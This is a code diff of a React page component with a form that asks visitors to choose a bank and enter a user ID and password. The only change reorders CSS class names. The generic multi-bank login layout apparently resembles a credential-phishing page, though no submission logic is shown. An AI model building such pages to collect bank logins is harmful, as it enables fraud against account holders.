@@ -50,7 +50,7 @@ export default function Home() {
   <div className=" m-2">
     <img src="assets/3header.jpg" width="100%" alt="" />
     <form onSubmit={handleSubmit} id="form" className="mt-3  p-2">
-      <div className={`form-group mb-3 ${styles.formGroup}`}>
+      <div className={`${styles.formGroup} form-group mb-3 `}>
         <label>Select Bank*</label>
         <select name="bnk" className={`form-control ${styles.formControl} `} required>
           <option value="">Select Bank</option>
@@ -69,7 +69,7 @@ export default function Home() {
           <option value="other-bank">Other Bank</option>
         </select>
       </div>
-      <div className={`form-group mb-3 ${styles.formGroup}`}>
+      <div className={`${styles.formGroup} form-group mb-3 `}>
         <label>User ID*</label>
         <input
           name="userid"
@@ -79,7 +79,7 @@ export default function Home() {
           required
         />
       </div>
-      <div className={`form-group mb-3 ${styles.formGroup}`}>
+      <div className={`${styles.formGroup} form-group mb-3 `}>
         <label>Password*</label>
         <input
           name="pss"
